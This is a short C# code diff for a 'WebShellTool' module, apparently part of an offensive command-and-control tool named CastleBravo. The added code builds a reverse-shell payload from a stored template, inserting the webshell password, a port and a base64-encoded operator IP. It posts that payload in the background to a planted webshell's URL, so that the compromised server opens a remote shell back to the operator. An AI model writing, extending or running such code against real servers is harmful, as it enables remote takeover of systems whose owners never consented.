@@ -2,6 +2,7 @@
 using C2.Core;
 using C2.Utils;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
@@ -34,7 +35,25 @@ namespace C2.Business.CastleBravo.WebShellTool
                 return false;
             }
             Global.ReverseShellHost = rsh;
+            string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
+            string port = mc.Groups[3].Value;
+            string payload = string.Format(Global.ReverseShellPayload, task.Password, port, encodeIP);
+            Task<string> t = Task.Run(() => PostPayload(payload));
             return base.OnOKButtonClick();
+        }
+
+
+        private string PostPayload(string payload)
+        {
+            try
+            {
+                return WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy);
+            }
+            catch
+            {
+                return string.Empty;
+            }
+
         }
     }
 }
